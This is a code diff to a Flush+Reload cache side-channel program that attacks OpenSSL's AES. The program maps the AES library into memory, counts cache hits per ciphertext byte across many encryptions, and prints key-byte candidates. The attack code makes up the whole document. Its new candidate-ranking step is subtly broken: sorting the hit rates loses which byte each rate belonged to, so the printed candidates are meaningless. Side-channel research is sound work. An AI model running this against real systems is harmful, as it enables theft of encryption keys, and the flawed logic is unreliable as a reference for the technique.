@@ -2,7 +2,11 @@
 #include <openssl/aes.h>
 #include <stdlib.h>
 #include <time.h>
-#include "fr_util.h"
+#include <algorithm>
+
+extern "C" {
+  #include "fr_util.h"
+}
 
 //number of encryptions to observe
 #define n_enc (10000)
@@ -34,11 +38,11 @@ int main(int argc, char **argv) {
   }
 
   //suppose we don't need to keep track of which cacheline was actually hit on, just which ciphertext bytes in relative positions get most hits
-  unsigned int *hits_per_byte = calloc(TXT_BYTES*256, sizeof(unsigned int));
+  unsigned int *hits_per_byte = (unsigned int *) calloc(TXT_BYTES*256, sizeof(unsigned int));
   if (!hits_per_byte) {
     return 1;
   }
-  uint64_t *encryptions_per_byte = calloc(TXT_BYTES*256, sizeof(uint64_t));
+  uint64_t *encryptions_per_byte = (uint64_t *) calloc(TXT_BYTES*256, sizeof(uint64_t));
   if (!encryptions_per_byte) {
     free(hits_per_byte);
     return 1;
@@ -82,7 +86,7 @@ int main(int argc, char **argv) {
     map_size |= 0xFFF;
     map_size += 1;
   }
-  start = mmap(0, map_size, PROT_READ, MAP_SHARED, aes, 0);
+  start = (uint64_t) mmap(0, map_size, PROT_READ, MAP_SHARED, aes, 0);
   end = start + size;
   //
 
@@ -245,30 +249,28 @@ int main(int argc, char **argv) {
   free(hits_per_byte);
   free(encryptions_per_byte);
 
-  //get maximum hit rate for each ciphertext position
-  unsigned int max_bytes[TXT_BYTES];
-
-  for (int i = 0; i < 16; ++i) {
-    double max = 0;
-    unsigned int max_pos = -1;
-
-    for (int ii = 0; ii < 256; ++ii) {
-      if (hit_rate[i][ii] > max) {
-        max = hit_rate[i][ii];
-        max_pos = ii;
-      }
+  //get 16 maximum hit rate candidates for each ciphertext position
+  for (int pos = 0; pos < TXT_BYTES; ++pos) {
+    std::sort(hit_rate[pos], hit_rate[pos] + 256);
+    printf("sorted!");
+    for (int byte = 0; byte < 256; ++byte) {
+      printf("%f ", hit_rate[pos][byte]);
     }
-    if (max_pos == -1) {
-      printf("sorting went wrong dude\n");
-    } else {
-      max_bytes[i] = max_pos;
+    printf(" end\n\n\n");
+
+    printf("--- Top 16 candidates for position %d---\n", pos);
+    for (int top = 255; top > (255 - TXT_BYTES); --top) {
+      printf("%d ", (int) hit_rate[pos][top] ^ 99);
     }
 
-    printf("Max hit rate at position %u: %f and ciphertext byte is %u\n", i , max, max_pos);
+    printf("\n\n\n");
   }
 
+  //now how to recover the intermediate values? we have possible ciphertext values from above..
+
+
   close(aes);
-  munmap(start, map_size);
+  munmap((void *)start, map_size);
   fflush(stdout);
 
   return 0;
